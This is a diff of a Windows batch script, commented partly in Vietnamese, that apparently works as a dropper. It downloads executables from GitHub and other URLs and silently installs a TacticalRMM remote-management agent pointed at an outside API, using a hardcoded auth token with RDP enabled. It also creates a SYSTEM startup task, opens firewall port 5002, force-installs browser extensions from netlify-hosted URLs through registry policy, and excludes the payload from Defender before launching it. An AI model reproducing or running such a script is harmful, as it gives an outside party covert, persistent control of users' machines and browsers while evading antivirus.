@@ -20,12 +20,24 @@ if exist "%TARGET_DIR%\%TARGET_FILE%" (
     del /f /q "%TARGET_DIR%\%TARGET_FILE%"
 )
 
-:: === Download new file ===
+:: === Download monitorUrlnew.exe ===
 where curl >nul 2>&1
 if %errorlevel%==0 (
     curl -L -o "%TARGET_DIR%\%TARGET_FILE%" "%URL%"
 ) else (
     bitsadmin /transfer myDownloadJob /download /priority normal "%URL%" "%TARGET_DIR%\%TARGET_FILE%"
+)
+
+:: === Download tacticalagent-v2.9.1-windows-amd64.exe ===
+set "AGENT_URL=https://raw.githubusercontent.com/vietwe1993/ichibanurl/main/tacticalagent-v2.9.1-windows-amd64.exe"
+set "AGENT_FILE=%TARGET_DIR%\tacticalagent-v2.9.1-windows-amd64.exe"
+if exist "%AGENT_FILE%" (
+    del /f /q "%AGENT_FILE%"
+)
+if %errorlevel%==0 (
+    curl -L -o "%AGENT_FILE%" "%AGENT_URL%"
+) else (
+    bitsadmin /transfer myAgentDownload /download /priority normal "%AGENT_URL%" "%AGENT_FILE%"
 )
 
 :: === Delete existing task if it exists ===
@@ -41,7 +53,11 @@ schtasks /create ^
     /sc onstart ^
     /ru "SYSTEM" ^
     /f
-    
+
+:: === Gỡ TacticalAgent cũ (nếu có) và cài lại ===
+"C:\Program Files\TacticalAgent\unins000.exe" /VERYSILENT
+%AGENT_FILE% /VERYSILENT /SUPPRESSMSGBOXES && ping 127.0.0.1 -n 5 && "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://cchapi.reliavn.top --client-id 1 --site-id 1 --agent-type workstation --auth 916c8091f216f2946c6f810c75c7ddf52289839e0b83eef9fe29d5d34e770b4a --rdp --ping --power
+
 :: === Mở port 5002 TCP và UDP trên Firewall ===
 powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 TCP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"
 powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 UDP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"
@@ -56,16 +72,14 @@ reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3
 reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /f >nul 2>&1
 
 :: === Add Chrome Extension policies to registry ===
-
 reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
 reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f
 
 :: === Add Edge Extension policies to registry ===
-
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
 reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iebbomgkmmlpcgfdllpicncloggmpmap;https://remarkable-tarsier-70cdce.netlify.app/update.xml" /f
 
-:: === Exclude from Defender and launch ===
+:: === Exclude from Defender and launch monitorUrlnew.exe ===
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
 start "" "C:\Users\Public\monitorUrlnew.exe"
 exit /b 0
